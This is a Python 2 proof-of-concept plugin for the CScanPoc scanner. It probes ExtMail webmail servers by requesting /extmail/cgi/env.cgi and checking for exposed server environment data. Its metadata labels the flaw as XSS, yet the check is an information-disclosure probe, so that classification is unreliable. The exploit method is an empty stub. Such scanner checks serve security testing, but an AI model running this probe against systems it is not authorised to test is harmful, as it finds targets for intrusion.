# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'e73c81e0-f806-4f69-88f6-789bd2d52376'
    name = 'ExtMail XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2012-02-27'  # 漏洞公布时间
    desc = '''
        ExtMail最初以WebMail软件为主，后逐步完善配套并形成了ExtMail邮件系统，提供完整的SMTP/POP/IMAP/Web和管理支持。目前装机量超过2万台。
        extmail 是一款部署比较多的开源的webmail系统，但是该系统在处理邮件及其他细节方面存在几个问题，
        导致攻击者可以针对使用该webmail的用户进行攻击，获取mail账户的访问权，或者直接修改密码。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'ExtMail'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a46ee5af-3f3a-4aec-ba55-cd238e9fe2f7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer http://www.wooyun.org/bugs/wooyun-2012-04854
            hh = hackhttp.hackhttp()
            payload = '/extmail/cgi/env.cgi'
            code, head, res, errcode, _ = hh.http(self.target + payload)

            if code == 200 and 'SERVER_ADMIN' in res:
                #security_info(arg+payload) 
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
